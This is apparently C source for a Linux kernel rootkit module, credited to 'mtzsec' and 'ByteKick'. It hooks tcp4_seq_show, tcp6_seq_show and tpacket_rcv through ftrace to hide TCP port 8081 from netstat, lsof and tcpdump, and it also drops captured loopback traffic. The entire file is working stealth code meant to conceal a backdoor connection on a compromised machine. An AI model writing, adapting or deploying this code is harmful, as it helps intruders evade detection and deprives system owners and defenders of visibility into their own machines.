#include <linux/module.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/tcp.h>
#include <linux/kernel.h>
#include "ftrace_helper.h"

#define PORT 8081               // Defines the port to be hidden (8081)

MODULE_LICENSE("GPL");        
MODULE_AUTHOR("mtzsec");   
MODULE_AUTHOR("ByteKick");
MODULE_DESCRIPTION("Hiding connections from netstat and lsof and tcpdump"); 
MODULE_VERSION("1.0");        

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
		struct packet_type *pt, struct net_device *orig_dev);

static int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
		struct packet_type *pt, struct net_device *orig_dev)
{
	struct iphdr *iph;
	struct ipv6hdr *ip6h;
	struct tcphdr *tcph;

	//for some reason loopback interface causes some crashes so just drop it
	if (!strncmp(dev->name, "lo", 2))
		return NET_RX_DROP;

	if (skb_linearize(skb)) goto out;

	if (skb->protocol == htons(ETH_P_IP)) {
		iph = ip_hdr(skb);
		if (iph->protocol == IPPROTO_TCP) {
			tcph = (void *)iph + iph->ihl * 4;
			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT) {
				printk(KERN_DEBUG "Port hidden!\n");
				return NET_RX_DROP;
			}
		}
	} else if (skb->protocol == htons(ETH_P_IPV6)) {
		ip6h = ipv6_hdr(skb);
		if (ip6h->nexthdr == IPPROTO_TCP) {
			tcph = (void *)ip6h + sizeof(*ip6h);
			if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT) {
				printk(KERN_DEBUG "Port hidden!\n");
				return NET_RX_DROP;
			}
		}
	}
out:
	return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}
static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }

    ret = orig_tcp6_seq_show(seq, v);
    return ret;
}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
	HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
};


static int __init hideport_init(void)
{
    int err; 
    err = fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
    if(err) 
        return err;

    return 0;
}

static void __exit hideport_exit(void)
{
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

module_init(hideport_init);
module_exit(hideport_exit);
